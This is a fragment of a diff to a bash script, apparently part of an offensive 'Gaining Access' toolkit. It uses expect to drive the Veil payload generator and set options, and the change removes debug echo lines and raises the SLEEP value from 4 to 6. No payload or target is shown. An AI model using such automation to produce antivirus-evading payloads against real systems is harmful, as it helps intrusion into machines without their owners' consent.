@@ -24,9 +24,6 @@ if [[ "$SO" == "1" ]]; then   # Gaining Access
     # LHOST=$SI
     # auto-run and set options
 
-    echo "DI: $DI"
-    echo "IP: $IP"
-    sleep 3
     expect -c '
     set timeout -1
     spawn "veil"
@@ -44,7 +41,7 @@ if [[ "$SO" == "1" ]]; then   # Gaining Access
     expect "]: "
     send -- "set PROCESSORS 1\r"
     expect "]: "
-    send -- "set SLEEP 4\r"
+    send -- "set SLEEP 6\r"
     expect "]: "
 
     send -- "generate\r"
